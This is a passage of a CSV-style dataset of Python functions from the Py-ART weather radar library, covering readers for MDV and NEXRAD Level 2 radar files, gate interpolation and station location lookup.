    if mdv.field_headers[0]['proj_type'] == mdv_common.PROJ_LATLON:
        xunits = 'degree_E'
        yunits = 'degree_N'
        y_start = mdv.field_headers[0]['grid_miny']
        x_start = mdv.field_headers[0]['grid_minx']
        y_step = mdv.field_headers[0]['grid_dy']
        x_step = mdv.field_headers[0]['grid_dx']
    elif mdv.field_headers[0]['proj_type'] != mdv_common.PROJ_POLAR_RADAR and mdv.field_headers[0]['proj_type'] != mdv_common.PROJ_RHI_RADAR:
        xunits = 'm'
        yunits = 'm'
    if mdv.field_headers[0]['vlevel_type'] == 4:
        zunits = 'm'
        z_line = [e * 1000.0 for e in z_line]
    elif mdv.field_headers[0]['vlevel_type'] == 9:
        zunits = 'degree'
    elif mdv.field_headers[0]['vlevel_type'] == 17:
        zunits = 'degree'
    elif mdv.field_headers[0]['vlevel_type'] == 3:
        zunits = 'mb'
    elif mdv.field_headers[0]['vlevel_type'] == 7:
        zunits = 'kelvin'
    else:
        warnings.warn((""While reading MDV found unexpected 'vlevel_type'"" + "" (%i), units in the z axis set to 'unknown'"") % mdv.field_headers[0]['vlevel_type'])
        zunits = 'unknown'
    x = get_metadata('x')
    x['data'] = np.linspace(x_start, x_start + x_step * (nx - 1), nx)
    x['units'] = xunits
    y = get_metadata('y')
    y['data'] = np.linspace(y_start, y_start + y_step * (ny - 1), ny)
    y['units'] = yunits
    z = get_metadata('z')
    z['data'] = np.array(z_line, dtype='float64')
    z['units'] = zunits
    metadata = filemetadata('metadata')
    for (meta_key, mdv_key) in mdv_common.MDV_METADATA_MAP.items():
        metadata[meta_key] = mdv.master_header[mdv_key]
    fields = {}
    mdv_fields = mdv._make_fields_list()
    for mdv_field in set(mdv_fields):
        field_name = filemetadata.get_field_name(mdv_field)
        if field_name is None:
            continue
        field_dic = filemetadata(field_name)
        field_dic['_FillValue'] = get_fillvalue()
        dataextractor = mdv_common._MdvVolumeDataExtractor(mdv, mdv.fields.index(mdv_field), get_fillvalue(), two_dims=False)
        if delay_field_loading:
            field_dic = LazyLoadDict(field_dic)
            field_dic.set_lazy('data', dataextractor)
        else:
            field_dic['data'] = dataextractor()
        fields[field_name] = field_dic
    if not delay_field_loading:
        mdv.close()
    return Grid(time, fields, metadata, origin_latitude, origin_longitude, origin_altitude, x, y, z)"
ARM-DOE/pyart,_time_dic_to_datetime,"def _time_dic_to_datetime(dic):
    """"""Return a datetime for the first element in a time dictionary.""""""
    if 'calendar' in dic:
        calendar = dic['calendar']
    else:
        calendar = 'standard'
    return num2date(dic['data'][0], dic['units'], calendar)"
ARM-DOE/pyart,read_mdv,"def read_mdv(filename, field_names=None, additional_metadata=None, file_field_names=False, exclude_fields=None, include_fields=None, delay_field_loading=False, **kwargs):
    """"""
    Read a MDV file.

    Parameters
    ----------
    filename : str
        Name of MDV file to read or file-like object pointing to the
        beginning of such a file.
    field_names : dict, optional
        Dictionary mapping MDV data type names to radar field names. If a
        data type found in the file does not appear in this dictionary or has
        a value of None it will not be placed in the radar.fields dictionary.
        A value of None, the default, will use the mapping defined in the
        Py-ART configuration file.
    additional_metadata : dict of dicts, optional
        Dictionary of dictionaries to retrieve metadata from during this read.
        This metadata is not used during any successive file reads unless
        explicitly included.  A value of None, the default, will not
        introduct any addition metadata and the file specific or default
        metadata as specified by the Py-ART configuration file will be used.
    file_field_names : bool, optional
        True to use the MDV data type names for the field names. If this
        case the field_names parameter is ignored. The field dictionary will
        likely only have a 'data' key, unless the fields are defined in
        `additional_metadata`.
    exclude_fields : list or None, optional
        List of fields to exclude from the radar object. This is applied
        after the `file_field_names` and `field_names` parameters. Set
        to None to include all fields specified by include_fields.
    include_fields : list or None, optional
        List of fields to include from the radar object. This is applied
        after the `file_field_names` and `field_names` parameters. Set
        to None to include all fields not specified by exclude_fields.
    delay_field_loading : bool
        True to delay loading of field data from the file until the 'data'
        key in a particular field dictionary is accessed. In this case
        the field attribute of the returned Radar object will contain
        LazyLoadDict objects not dict objects. Not all file types support this
        parameter.

    Returns
    -------
    radar : Radar
        Radar object containing data from MDV file.

    Notes
    -----
    Currently this function can only read polar MDV files with fields
    compressed with gzip or zlib.

    """"""
    _test_arguments(kwargs)
    filemetadata = FileMetadata('mdv', field_names, additional_metadata, file_field_names, exclude_fields, include_fields)
    mdvfile = mdv_common.MdvFile(prepare_for_read(filename))
    (az_deg, range_km, el_deg) = mdvfile._calc_geometry()
    naz = len(az_deg)
    nele = len(el_deg)
    scan_type = mdvfile.projection
    if scan_type not in ['ppi', 'rhi']:
        raise NotImplementedError('No support for scan_type %s.' % scan_type)
    time = filemetadata('time')
    units = make_time_unit_str(mdvfile.times['time_begin'])
    time['units'] = units
    time_start = date2num(mdvfile.times['time_begin'], units)
    time_end = date2num(mdvfile.times['time_end'], units)
    time['data'] = np.linspace(time_start, time_end, naz * nele)
    _range = filemetadata('range')
    _range['data'] = np.array(range_km * 1000.0, dtype='float32')
    _range['meters_to_center_of_first_gate'] = _range['data'][0]
    _range['meters_between_gates'] = _range['data'][1] - _range['data'][0]
    fields = {}
    for mdv_field in set(mdvfile.fields):
        field_name = filemetadata.get_field_name(mdv_field)
        if field_name is None:
            continue
        field_dic = filemetadata(field_name)
        field_dic['_FillValue'] = get_fillvalue()
        dataextractor = mdv_common._MdvVolumeDataExtractor(mdvfile, mdvfile.fields.index(mdv_field), get_fillvalue())
        if delay_field_loading:
            field_dic = LazyLoadDict(field_dic)
            field_dic.set_lazy('data', dataextractor)
        else:
            field_dic['data'] = dataextractor()
        fields[field_name] = field_dic
    metadata = filemetadata('metadata')
    for (meta_key, mdv_key) in mdv_common.MDV_METADATA_MAP.items():
        metadata[meta_key] = mdvfile.master_header[mdv_key]
    latitude = filemetadata('latitude')
    latitude['data'] = np.array([mdvfile.radar_info['latitude_deg']], dtype='float64')
    longitude = filemetadata('longitude')
    longitude['data'] = np.array([mdvfile.radar_info['longitude_deg']], dtype='float64')
    altitude = filemetadata('altitude')
    altitude['data'] = np.array([mdvfile.radar_info['altitude_km'] * 1000.0], dtype='float64')
    sweep_number = filemetadata('sweep_number')
    sweep_mode = filemetadata('sweep_mode')
    fixed_angle = filemetadata('fixed_angle')
    sweep_start_ray_index = filemetadata('sweep_start_ray_index')
    sweep_end_ray_index = filemetadata('sweep_end_ray_index')
    len_time = len(time['data'])
    if scan_type == 'ppi':
        nsweeps = nele
        sweep_number['data'] = np.arange(nsweeps, dtype='int32')
        sweep_mode['data'] = np.array(nsweeps * ['azimuth_surveillance'], dtype='S')
        fixed_angle['data'] = np.array(el_deg, dtype='float32')
        sweep_start_ray_index['data'] = np.arange(0, len_time, naz, dtype='int32')
        sweep_end_ray_index['data'] = np.arange(naz - 1, len_time, naz, dtype='int32')
    elif scan_type == 'rhi':
        nsweeps = naz
        sweep_number['data'] = np.arange(nsweeps, dtype='int32')
        sweep_mode['data'] = np.array(nsweeps * ['rhi'], dtype='S')
        fixed_angle['data'] = np.array(az_deg, dtype='float32')
        sweep_start_ray_index['data'] = np.arange(0, len_time, nele, dtype='int32')
        sweep_end_ray_index['data'] = np.arange(nele - 1, len_time, nele, dtype='int32')
    azimuth = filemetadata('azimuth')
    elevation = filemetadata('elevation')
    if scan_type == 'ppi':
        azimuth['data'] = np.tile(az_deg, nele)
        elevation['data'] = np.array(el_deg).repeat(naz)
    elif scan_type == 'rhi':
        azimuth['data'] = np.array(az_deg).repeat(nele)
        elevation['data'] = np.tile(el_deg, naz)
    if mdvfile.radar_info['prt2_s'] == 0.0:
        prt_mode_str = 'fixed'
    else:
        prt_mode_str = 'dual'
    prt_mode = filemetadata('prt_mode')
    prt = filemetadata('prt')
    unambiguous_range = filemetadata('unambiguous_range')
    nyquist_velocity = filemetadata('nyquist_velocity')
    beam_width_h = filemetadata('radar_beam_width_h')
    beam_width_v = filemetadata('radar_beam_width_v')
    prt_mode['data'] = np.array([prt_mode_str] * nsweeps, dtype='S')
    prt['data'] = np.array([mdvfile.radar_info['prt_s']] * nele * naz, dtype='float32')
    urange_m = mdvfile.radar_info['unambig_range_km'] * 1000.0
    unambiguous_range['data'] = np.array([urange_m] * naz * nele, dtype='float32')
    uvel_mps = mdvfile.radar_info['unambig_vel_mps']
    nyquist_velocity['data'] = np.array([uvel_mps] * naz * nele, dtype='float32')
    beam_width_h['data'] = np.array([mdvfile.radar_info['horiz_beam_width_deg']], dtype='float32')
    beam_width_v['data'] = np.array([mdvfile.radar_info['vert_beam_width_deg']], dtype='float32')
    instrument_parameters = {'prt_mode': prt_mode, 'prt': prt, 'unambiguous_range': unambiguous_range, 'nyquist_velocity': nyquist_velocity, 'radar_beam_width_h': beam_width_h, 'radar_beam_width_v': beam_width_v}
    if not delay_field_loading:
        mdvfile.close()
    return Radar(time, _range, fields, metadata, scan_type, latitude, longitude, altitude, sweep_number, sweep_mode, fixed_angle, sweep_start_ray_index, sweep_end_ray_index, azimuth, elevation, instrument_parameters=instrument_parameters)"
ARM-DOE/pyart,read_nexrad_archive,"def read_nexrad_archive(filename, field_names=None, additional_metadata=None, file_field_names=False, exclude_fields=None, include_fields=None, delay_field_loading=False, station=None, scans=None, linear_interp=True, storage_options={'anon': True}, **kwargs):
    """"""
    Read a NEXRAD Level 2 Archive file.

    Parameters
    ----------
    filename : str
        Filename of NEXRAD Level 2 Archive file. The files hosted by
        at the NOAA National Climate Data Center [1]_ as well as on the
        UCAR THREDDS Data Server [2]_ have been tested. Other NEXRAD
        Level 2 Archive files may or may not work. Message type 1 file
        and message type 31 files are supported.
    field_names : dict, optional
        Dictionary mapping NEXRAD moments to radar field names. If a
        data type found in the file does not appear in this dictionary or has
        a value of None it will not be placed in the radar.fields dictionary.
        A value of None, the default, will use the mapping defined in the
        metadata configuration file.
    additional_metadata : dict of dicts, optional
        Dictionary of dictionaries to retrieve metadata from during this read.
        This metadata is not used during any successive file reads unless
        explicitly included. A value of None, the default, will not
        introduct any addition metadata and the file specific or default
        metadata as specified by the metadata configuration file will be used.
    file_field_names : bool, optional
        True to use the NEXRAD field names for the field names. If this
        case the field_names parameter is ignored. The field dictionary will
        likely only have a 'data' key, unless the fields are defined in
        `additional_metadata`.
    exclude_fields : list or None, optional
        List of fields to exclude from the radar object. This is applied
        after the `file_field_names` and `field_names` parameters. Set
        to None to include all fields specified by include_fields.
    include_fields : list or None, optional
        List of fields to include from the radar object. This is applied
        after the `file_field_names` and `field_names` parameters. Set
        to None to include all fields not specified by exclude_fields.
    delay_field_loading : bool, optional
        True to delay loading of field data from the file until the 'data'
        key in a particular field dictionary is accessed. In this case
        the field attribute of the returned Radar object will contain
        LazyLoadDict objects not dict objects.
    station : str or None, optional
        Four letter ICAO name of the NEXRAD station used to determine the
        location in the returned radar object. This parameter is only
        used when the location is not contained in the file, which occur
        in older NEXRAD message 1 files.
    scans : list or None, optional
        Read only specified scans from the file. None (the default) will read
        all scans.
    linear_interp : bool, optional
        True (the default) to perform linear interpolation between valid pairs
        of gates in low resolution rays in files mixed resolution rays.
        False will perform a nearest neighbor interpolation. This parameter is
        not used if the resolution of all rays in the file or requested sweeps
        is constant.
    storage_options : dict, optional
        Parameters passed to the backend file-system such as Google Cloud Storage,
        Amazon Web Service S3.
    **kwargs
        Additional keyword arguments to pass to fsspec to open the dataset

    Returns
    -------
    radar : Radar
        Radar object containing all moments and sweeps/cuts in the volume.
        Gates not collected are masked in the field data.

    References
    ----------
    .. [1] http://www.ncdc.noaa.gov/
    .. [2] http://thredds.ucar.edu/thredds/catalog.html

    """"""
    _test_arguments(kwargs)
    filemetadata = FileMetadata('nexrad_archive', field_names, additional_metadata, file_field_names, exclude_fields, include_fields)
    nfile = NEXRADLevel2File(prepare_for_read(filename, storage_options=storage_options))
    scan_info = nfile.scan_info(scans)
    time = filemetadata('time')
    (time_start, _time) = nfile.get_times(scans)
    time['data'] = _time
    time['units'] = make_time_unit_str(time_start)
    _range = filemetadata('range')
    (first_gate, gate_spacing, last_gate) = _find_range_params(scan_info, filemetadata)
    _range['data'] = np.arange(first_gate, last_gate, gate_spacing, 'float32')
    _range['meters_to_center_of_first_gate'] = float(first_gate)
    _range['meters_between_gates'] = float(gate_spacing)
    metadata = filemetadata('metadata')
    metadata['original_container'] = 'NEXRAD Level II'
    vcp_pattern = nfile.get_vcp_pattern()
    if vcp_pattern is not None:
        metadata['vcp_pattern'] = vcp_pattern
    if 'icao' in nfile.volume_header.keys():
        metadata['instrument_name'] = nfile.volume_header['icao'].decode()
    scan_type = 'ppi'
    latitude = filemetadata('latitude')
    longitude = filemetadata('longitude')
    altitude = filemetadata('altitude')
    if nfile._msg_type == '1' and station is not None:
        (lat, lon, alt) = get_nexrad_location(station)
    elif 'icao' in nfile.volume_header.keys() and nfile.volume_header['icao'].decode()[0] == 'T':
        (lat, lon, alt) = get_nexrad_location(nfile.volume_header['icao'].decode())
    else:
        (lat, lon, alt) = nfile.location()
    latitude['data'] = np.array([lat], dtype='float64')
    longitude['data'] = np.array([lon], dtype='float64')
    altitude['data'] = np.array([alt], dtype='float64')
    sweep_number = filemetadata('sweep_number')
    sweep_mode = filemetadata('sweep_mode')
    sweep_start_ray_index = filemetadata('sweep_start_ray_index')
    sweep_end_ray_index = filemetadata('sweep_end_ray_index')
    if scans is None:
        nsweeps = int(nfile.nscans)
    else:
        nsweeps = len(scans)
    sweep_number['data'] = np.arange(nsweeps, dtype='int32')
    sweep_mode['data'] = np.array(nsweeps * ['azimuth_surveillance'], dtype='S')
    rays_per_scan = [s['nrays'] for s in scan_info]
    sweep_end_ray_index['data'] = np.cumsum(rays_per_scan, dtype='int32') - 1
    rays_per_scan.insert(0, 0)
    sweep_start_ray_index['data'] = np.cumsum(rays_per_scan[:-1], dtype='int32')
    azimuth = filemetadata('azimuth')
    elevation = filemetadata('elevation')
    fixed_angle = filemetadata('fixed_angle')
    azimuth['data'] = nfile.get_azimuth_angles(scans)
    elevation['data'] = nfile.get_elevation_angles(scans).astype('float32')
    fixed_agl = []
    for i in nfile.get_target_angles(scans):
        if i > 180:
            i = i - 360.0
            warnings.warn('Fixed_angle(s) greater than 180 degrees present. Assuming angle to be negative so subtrating 360', UserWarning)
        else:
            i = i
        fixed_agl.append(i)
    fixed_angles = np.array(fixed_agl, dtype='float32')
    fixed_angle['data'] = fixed_angles
    max_ngates = len(_range['data'])
    available_moments = {m for scan in scan_info for m in scan['moments']}
    interpolate = _find_scans_to_interp(scan_info, first_gate, gate_spacing, filemetadata)
    fields = {}
    for moment in available_moments:
        field_name = filemetadata.get_field_name(moment)
        if field_name is None:
            continue
        dic = filemetadata(field_name)
        dic['_FillValue'] = get_fillvalue()
        if delay_field_loading and moment not in interpolate:
            dic = LazyLoadDict(dic)
            data_call = _NEXRADLevel2StagedField(nfile, moment, max_ngates, scans)
            dic.set_lazy('data', data_call)
        else:
            mdata = nfile.get_data(moment, max_ngates, scans=scans)
            if moment in interpolate:
                interp_scans = interpolate[moment]
                warnings.warn('Gate spacing is not constant, interpolating data in ' + f'scans {interp_scans} for moment {moment}.', UserWarning)
                for scan in interp_scans:
                    idx = scan_info[scan]['moments'].index(moment)
                    moment_ngates = scan_info[scan]['ngates'][idx]
                    start = sweep_start_ray_index['data'][scan]
                    end = sweep_end_ray_index['data'][scan]
                    if interpolate['multiplier'] == '4':
                        multiplier = '4'
                    else:
                        multiplier = '2'
                    _interpolate_scan(mdata, start, end, moment_ngates, multiplier, linear_interp)
            dic['data'] = mdata
        fields[field_name] = dic
    nyquist_velocity = filemetadata('nyquist_velocity')
    unambiguous_range = filemetadata('unambiguous_range')
    nyquist_velocity['data'] = nfile.get_nyquist_vel(scans).astype('float32')
    unambiguous_range['data'] = nfile.get_unambigous_range(scans).astype('float32')
    instrument_parameters = {'unambiguous_range': unambiguous_range, 'nyquist_velocity': nyquist_velocity}
    nfile.close()
    return Radar(time, _range, fields, metadata, scan_type, latitude, longitude, altitude, sweep_number, sweep_mode, fixed_angle, sweep_start_ray_index, sweep_end_ray_index, azimuth, elevation, instrument_parameters=instrument_parameters)"
ARM-DOE/pyart,_find_range_params,"def _find_range_params(scan_info, filemetadata):
    """"""Return range parameters, first_gate, gate_spacing, last_gate.""""""
    min_first_gate = 999999
    min_gate_spacing = 999999
    max_last_gate = 0
    for scan_params in scan_info:
        ngates = scan_params['ngates'][0]
        for (i, moment) in enumerate(scan_params['moments']):
            if filemetadata.get_field_name(moment) is None:
                continue
            first_gate = scan_params['first_gate'][i]
            gate_spacing = scan_params['gate_spacing'][i]
            last_gate = first_gate + gate_spacing * (ngates - 0.5)
            min_first_gate = min(min_first_gate, first_gate)
            min_gate_spacing = min(min_gate_spacing, gate_spacing)
            max_last_gate = max(max_last_gate, last_gate)
    return (min_first_gate, min_gate_spacing, max_last_gate)"
ARM-DOE/pyart,_find_scans_to_interp,"def _find_scans_to_interp(scan_info, first_gate, gate_spacing, filemetadata):
    """"""Return a dict indicating what moments/scans need interpolation.""""""
    moments = {m for scan in scan_info for m in scan['moments']}
    interpolate = {moment: [] for moment in moments}
    for (scan_num, scan) in enumerate(scan_info):
        for moment in moments:
            if moment not in scan['moments']:
                continue
            if filemetadata.get_field_name(moment) is None:
                continue
            index = scan['moments'].index(moment)
            first = scan['first_gate'][index]
            spacing = scan['gate_spacing'][index]
            if first != first_gate or spacing != gate_spacing:
                interpolate[moment].append(scan_num)
                if spacing == gate_spacing * 4:
                    interpolate['multiplier'] = '4'
                elif spacing == gate_spacing * 2:
                    interpolate['multiplier'] = '2'
                else:
                    raise ValueError('Gate spacing is neither 1/4 or 1/2')
    interpolate = {k: v for (k, v) in interpolate.items() if len(v) != 0}
    return interpolate"
ARM-DOE/pyart,_interpolate_scan,"def _interpolate_scan(mdata, start, end, moment_ngates, multiplier, linear_interp=True):
    """"""Interpolate a single NEXRAD moment scan from 1000 m to 250 m.""""""
    fill_value = -9999
    data = mdata.filled(fill_value)
    scratch_ray = np.empty((data.shape[1],), dtype=data.dtype)
    if multiplier == '4':
        _fast_interpolate_scan_4(data, scratch_ray, fill_value, start, end, moment_ngates, linear_interp)
    else:
        _fast_interpolate_scan_2(data, scratch_ray, fill_value, start, end, moment_ngates, linear_interp)
    mdata[:] = np.ma.array(data, mask=data == fill_value)"
ARM-DOE/pyart,__init__,"def __init__(self, nfile, moment, max_ngates, scans):
    """"""initialize.""""""
    self.nfile = nfile
    self.moment = moment
    self.max_ngates = max_ngates
    self.scans = scans"
ARM-DOE/pyart,__call__,"def __call__(self):
    """"""Return the array containing the field data.""""""
    return self.nfile.get_data(self.moment, self.max_ngates, scans=self.scans)"
ARM-DOE/pyart,read_nexrad_cdm,"def read_nexrad_cdm(filename, field_names=None, additional_metadata=None, file_field_names=False, exclude_fields=None, include_fields=None, station=None, **kwargs):
    """"""
    Read a Common Data Model (CDM) NEXRAD Level 2 file.

    Parameters
    ----------
    filename : str
        File name or URL of a Common Data Model (CDM) NEXRAD Level 2 file.
        File of in this format can be created using the NetCDF Java Library
        tools [1]_. A URL of a OPeNDAP file on the UCAR THREDDS Data
        Server [2]_ is also accepted the netCDF4 library has been compiled
        with OPeNDAP support.
    field_names : dict, optional
        Dictionary mapping NEXRAD moments to radar field names. If a
        data type found in the file does not appear in this dictionary or has
        a value of None it will not be placed in the radar.fields dictionary.
        A value of None, the default, will use the mapping defined in the
        metadata configuration file.
    additional_metadata : dict of dicts, optional
        Dictionary of dictionaries to retrieve metadata from during this read.
        This metadata is not used during any successive file reads unless
        explicitly included. A value of None, the default, will not
        introduct any addition metadata and the file specific or default
        metadata as specified by the metadata configuration file will be used.
    file_field_names : bool, optional
        True to use the NEXRAD field names for the field names. If this
        case the field_names parameter is ignored. The field dictionary will
        likely only have a 'data' key, unless the fields are defined in
        `additional_metadata`.
    exclude_fields : list or None, optional
        List of fields to exclude from the radar object. This is applied
        after the `file_field_names` and `field_names` parameters. Set
        to None to include all fields specified by include_fields.
    include_fields : list or None, optional
        List of fields to include from the radar object. This is applied
        after the `file_field_names` and `field_names` parameters. Set
        to None to include all fields not specified by exclude_fields.
    station : str
        Four letter ICAO name of the NEXRAD station used to determine the
        location in the returned radar object. This parameter is only
        used when the location is not contained in the file, which occur
        in older NEXRAD files. If the location is not provided in the file
        and this parameter is set to None the station name will be determined
        from the filename.

    Returns
    -------
    radar : Radar
        Radar object containing all moments and sweeps/cuts in the volume.
        Gates not collected are masked in the field data.

    References
    ----------
    .. [1] http://www.unidata.ucar.edu/software/netcdf-java/documentation.htm
    .. [2] http://thredds.ucar.edu/thredds/catalog.html

    """"""
    _test_arguments(kwargs)
    filemetadata = FileMetadata('nexrad_cdm', field_names, additional_metadata, file_field_names, exclude_fields, include_fields)
    dataset = netCDF4.Dataset(filename)
    dattrs = dataset.ncattrs()
    dvars = dataset.variables
    if 'cdm_data_type' not in dattrs or dataset.cdm_data_type != 'RADIAL':
        raise OSError('%s is not a valid CDM NetCDF file' % filename)
    scan_info = _scan_info(dvars)
    radials_per_scan = [max(s['nradials']) for s in scan_info]
    ngates_per_scan = [max(s['ngates']) for s in scan_info]
    ngates = max(ngates_per_scan)
    nrays = sum(radials_per_scan)
    nsweeps = len(scan_info)
    time_data = np.empty((nrays,), dtype='float64')
    azim_data = np.empty((nrays,), dtype='float32')
    elev_data = np.empty((nrays,), dtype='float32')
    fixed_agl_data = np.empty((nsweeps,), dtype='float32')
    fdata = {'Reflectivity': np.ma.masked_equal(np.ones((nrays, ngates), dtype='float32'), 1), 'RadialVelocity': np.ma.masked_equal(np.ones((nrays, ngates), dtype='float32'), 1), 'SpectrumWidth': np.ma.masked_equal(np.ones((nrays, ngates), dtype='float32'), 1), 'DifferentialReflectivity': np.ma.masked_equal(np.ones((nrays, ngates), dtype='float32'), 1), 'CorrelationCoefficient': np.ma.masked_equal(np.ones((nrays, ngates), dtype='float32'), 1), 'DifferentialPhase': np.ma.masked_equal(np.ones((nrays, ngates), dtype='float32'), 1)}
    ray_i = 0
    for (scan_index, scan_dic) in enumerate(scan_info):
        var_index = scan_dic['index'][0]
        nradials = scan_dic['nradials'][0]
        time_var = scan_dic['time_vars'][0]
        azimuth_var = scan_dic['azimuth_vars'][0]
        elevation_var = scan_dic['elevation_vars'][0]
        nradials = scan_dic['nradials'][0]
        end = ray_i + nradials
        time_data[ray_i:end] = dvars[time_var][var_index][:nradials]
        azim_data[ray_i:end] = dvars[azimuth_var][var_index][:nradials]
        elev_data[ray_i:end] = dvars[elevation_var][var_index][:nradials]
        fixed_agl_data[scan_index] = np.mean(dvars[elevation_var][var_index][:nradials])
        for (i, moment) in enumerate(scan_dic['moments']):
            moment_index = scan_dic['index'][i]
            m_ngates = scan_dic['ngates'][i]
            m_nradials = scan_dic['nradials'][i]
            if moment.endswith('_HI'):
                fdata_name = moment[:-3]
            else:
                fdata_name = moment
            sweep = _get_moment_data(dvars[moment], moment_index, m_ngates)
            fdata[fdata_name][ray_i:ray_i + m_nradials, :m_ngates] = sweep[:m_nradials, :m_ngates]
        ray_i += nradials
    time = filemetadata('time')
    first_time_var = scan_info[0]['time_vars'][0]
    time_start = datetime.strptime(dvars[first_time_var].units[-20:], '%Y-%m-%dT%H:%M:%SZ')
    time_start = time_start + timedelta(seconds=int(time_data[0] / 1000))
    time['data'] = time_data / 1000.0 - int(time_data[0] / 1000)
    time['units'] = make_time_unit_str(time_start)
    _range = filemetadata('range')
    max_ngates_scan_index = ngates_per_scan.index(ngates)
    scan_dic = scan_info[max_ngates_scan_index]
    max_ngates_moment_index = scan_dic['ngates'].index(ngates)
    distance_var = scan_dic['distance_vars'][max_ngates_moment_index]
    _range['data'] = dvars[distance_var][:]
    _range['meters_to_center_of_first_gate'] = _range['data'][0]
    _range['meters_between_gates'] = _range['data'][1] - _range['data'][0]
    fields = {}
    for (moment_name, moment_data) in fdata.items():
        field_name = filemetadata.get_field_name(moment_name)
        field_dic = filemetadata(field_name)
        field_dic['_FillValue'] = get_fillvalue()
        field_dic['data'] = moment_data
        fields[field_name] = field_dic
    metadata = filemetadata('metadata')
    metadata['original_container'] = 'NEXRAD Level II'
    scan_type = 'ppi'
    latitude = filemetadata('latitude')
    longitude = filemetadata('longitude')
    altitude = filemetadata('altitude')
    if hasattr(dataset, 'StationLatitude') and hasattr(dataset, 'StationLongitude') and hasattr(dataset, 'StationElevationInMeters'):
        lat = dataset.StationLatitude
        lon = dataset.StationLongitude
        alt = dataset.StationElevationInMeters
    else:
        if station is None:
            station = os.path.basename(filename)[:4].upper()
        (lat, lon, alt) = get_nexrad_location(station)
    latitude['data'] = np.array([lat], dtype='float64')
    longitude['data'] = np.array([lon], dtype='float64')
    altitude['data'] = np.array([alt], dtype='float64')
    sweep_number = filemetadata('sweep_number')
    sweep_mode = filemetadata('sweep_mode')
    sweep_start_ray_index = filemetadata('sweep_start_ray_index')
    sweep_end_ray_index = filemetadata('sweep_end_ray_index')
    sweep_number['data'] = np.arange(nsweeps, dtype='int32')
    sweep_mode['data'] = np.array(nsweeps * ['azimuth_surveillance'], dtype='S')
    rays_per_scan = list(radials_per_scan)
    sweep_end_ray_index['data'] = np.cumsum(rays_per_scan, dtype='int32') - 1
    rays_per_scan.insert(0, 0)
    sweep_start_ray_index['data'] = np.cumsum(rays_per_scan[:-1], dtype='int32')
    azimuth = filemetadata('azimuth')
    elevation = filemetadata('elevation')
    fixed_angle = filemetadata('fixed_angle')
    azimuth['data'] = azim_data
    elevation['data'] = elev_data
    fixed_angle['data'] = fixed_agl_data
    dataset.close()
    return Radar(time, _range, fields, metadata, scan_type, latitude, longitude, altitude, sweep_number, sweep_mode, fixed_angle, sweep_start_ray_index, sweep_end_ray_index, azimuth, elevation, instrument_parameters=None)"
ARM-DOE/pyart,_scan_info,"def _scan_info(dvars):
    """"""Return a list of information on the scans in the volume.""""""
    time_variables = [k for k in dvars.keys() if k.startswith('time')]
    scan_start_times = set()
    for var in time_variables:
        for time in dvars[var][:, 0]:
            scan_start_times.add(time)
    scan_start_times = list(scan_start_times)
    scan_start_times.sort()
    time_var_to_moment = {'timeR': 'Reflectivity', 'timeV': 'RadialVelocity', 'timeD': 'DifferentialReflectivity', 'timeC': 'CorrelationCoefficient', 'timeP': 'DifferentialPhase', 'timeR_HI': 'Reflectivity_HI', 'timeV_HI': 'RadialVelocity_HI', 'timeD_HI': 'DifferentialReflectivity_HI', 'timeC_HI': 'CorrelationCoefficient_HI', 'timeP_HI': 'DifferentialPhase_HI'}
    scan_info = [{'start_time': t, 'time_vars': [], 'moments': [], 'nradials': [], 'ngates': [], 'elevation_vars': [], 'azimuth_vars': [], 'distance_vars': [], 'index': []} for t in scan_start_times]
    for time_var in time_variables:
        for (time_var_i, time) in enumerate(dvars[time_var][:, 0]):
            scan_index = scan_start_times.index(time)
            scan_dic = scan_info[scan_index]
            moment = time_var_to_moment[time_var]
            _populate_scan_dic(scan_dic, time_var, time_var_i, moment, dvars)
            if time_var == 'timeV':
                _populate_scan_dic(scan_dic, time_var, time_var_i, 'SpectrumWidth', dvars)
            if time_var == 'timeV_HI':
                _populate_scan_dic(scan_dic, time_var, time_var_i, 'SpectrumWidth_HI', dvars)
    return scan_info"
ARM-DOE/pyart,_populate_scan_dic,"def _populate_scan_dic(scan_dic, time_var, time_var_i, moment, dvars):
    """"""Populate a dictionary in the scan_info list.""""""
    if time_var.endswith('HI'):
        var_suffix = time_var[-4:]
    else:
        var_suffix = time_var[-1:]
    ngates = dvars['numGates' + var_suffix][time_var_i]
    nradials = dvars['numRadials' + var_suffix][time_var_i]
    scan_dic['time_vars'].append(time_var)
    scan_dic['index'].append(time_var_i)
    scan_dic['moments'].append(moment)
    scan_dic['elevation_vars'].append('elevation' + var_suffix)
    scan_dic['azimuth_vars'].append('azimuth' + var_suffix)
    scan_dic['distance_vars'].append('distance' + var_suffix)
    scan_dic['ngates'].append(ngates)
    scan_dic['nradials'].append(nradials)
    return"
ARM-DOE/pyart,_get_moment_data,"def _get_moment_data(moment_var, index, ngates):
    """"""Retieve moment data for a given scan.""""""
    moment_var.set_auto_maskandscale(False)
    raw_moment_data = moment_var[index][:, :ngates]
    if '_Unsigned' in moment_var.ncattrs():
        if raw_moment_data.dtype == np.int8:
            raw_moment_data = raw_moment_data.view('uint8')
        if raw_moment_data.dtype == np.int16:
            raw_moment_data = raw_moment_data.view('uint16')
    raw_moment_data = np.ma.masked_less_equal(raw_moment_data, 1)
    if 'scale_factor' in moment_var.ncattrs():
        scale = moment_var.scale_factor
    else:
        scale = 1.0
    if 'add_offset' in moment_var.ncattrs():
        add_offset = moment_var.add_offset
    else:
        add_offset = 0.0
    return raw_moment_data * scale + add_offset"
ARM-DOE/pyart,get_nexrad_location,"def get_nexrad_location(station):
    """"""
    Return the latitude, longitude and altitude of a NEXRAD station.

    Parameters
    ----------
    station : str
        Four letter NEXRAD station ICAO name.

    Returns
    -------
    lat, lon, alt : float
        Latitude (in degrees), longitude (in degrees), and altitude
        (in meters above mean sea level) of the NEXRAD station.

    """"""
    loc = NEXRAD_LOCATIONS[station.upper()]
    loc['elev'] = loc['elev'] * 0.3048
    return (loc['lat'], loc['lon'], loc['elev'])"
ARM-DOE/pyart,_bits_to_code,"def _bits_to_code(msg, moment):
    """"""
    Convert number of bits to the proper code for unpacking.
    Based on the code found in MetPy:
    https://github.com/Unidata/MetPy/blob/40d5c12ab341a449c9398508bd41
    d010165f9eeb/src/metpy/io/_tools.py#L313-L321
    """"""
    if msg['header']['type'] == 1:
        word_size = msg[moment]['data'].dtype
        if word_size == 'uint16':
            return 'H'
        elif word_size == 'uint8':
            return 'B'
        else:
            warnings.warn(('Unsupported bit size: %s. Returning ""B""', word_size))
            return 'B'
    elif msg['header']['type'] == 31:
        word_size = msg[moment]['word_size']
        if word_size == 16:
            return 'H'
        elif word_size == 8:
            return 'B'
        else:
            warnings.warn(('Unsupported bit size: %s. Returning ""B""', word_size))
